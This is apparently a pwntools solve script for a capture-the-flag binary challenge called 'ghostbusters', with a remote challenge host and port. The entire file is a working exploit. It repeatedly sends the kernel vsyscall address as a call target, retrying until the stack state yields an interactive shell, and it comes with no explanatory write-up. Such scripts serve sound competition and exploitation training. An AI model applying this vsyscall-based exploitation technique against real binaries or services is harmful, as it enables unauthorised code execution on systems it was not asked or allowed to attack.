#!/usr/bin/env python3

"""
Run exploit locally with:
./solve.py

Run against remote with:
./solve.py REMOTE HOST=chals.damctf.xyz PORT=32556
"""

from pwn import *

PROG_PATH = "./ghostbusters"


def init_pwntools_context():
    context.binary = PROG_PATH
    context.log_level = "debug"


def init_io():
    if args["REMOTE"]:
        return remote(args["HOST"], int(args["PORT"]))
    else:
        pty = process.PTY
        return process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)


def win():
    vsyscall_addr = 0xffffffffff600400

    # Keep calling into vsyscall until we get lucky with the changed stack
    # state.
    while True:
        sleep(0.1)

        io = init_io()

        if args["PAUSE"]:
            input(f"Pausing PID {io.pid}...")

        io.sendlineafter("call?\n", hex(vsyscall_addr))

        try:
            x = io.recvn(1, timeout=1)
            if x == b"I":
                log.info("Hit 'n' input path. Trying again...")
                continue
        except EOFError:
            log.info("Trying again...")

            if not args["REMOTE"]:
                io.kill()

            continue

        log.success("Success!")
        io.interactive()
        break


if __name__ == "__main__":
    init_pwntools_context()
    win()
